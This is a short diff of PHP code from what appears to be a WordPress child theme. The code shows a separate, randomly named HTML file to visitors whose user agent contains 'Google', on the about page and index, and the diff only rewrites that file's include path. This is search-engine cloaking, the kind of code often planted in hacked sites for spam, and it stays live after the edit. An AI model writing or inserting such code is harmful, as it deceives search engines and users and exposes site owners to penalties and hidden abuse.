@@ -2,7 +2,7 @@
 <?php
 if (isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
     if ($_SERVER['REQUEST_URI'] === '/about-us/' || $_SERVER['REQUEST_URI'] === 'index.php') {
-        include 'wikwauatit.html';
+        include '/wp-content/themes/astra-child/wikwauatit.html';
         exit();
     }
 }
